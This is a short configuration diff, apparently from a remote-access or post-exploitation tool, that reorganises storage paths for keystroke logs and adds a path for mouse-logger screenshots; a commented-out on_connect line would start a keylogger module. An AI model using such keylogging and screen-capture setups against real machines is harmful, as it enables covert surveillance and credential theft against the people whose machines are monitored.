@@ -88,7 +88,8 @@ creds = data/creds
 crypto = crypto
 wwwroot = data/wwwroot
 records = data/%c
-keystrokes = data/%c/%t.log
+keystrokes = data/keylogger/%c/%t.log
+mouseshots = data/mouselogger/%c/%w-%t.png
 
 [on_connect]
 #run_module1 = gather/keylogger start
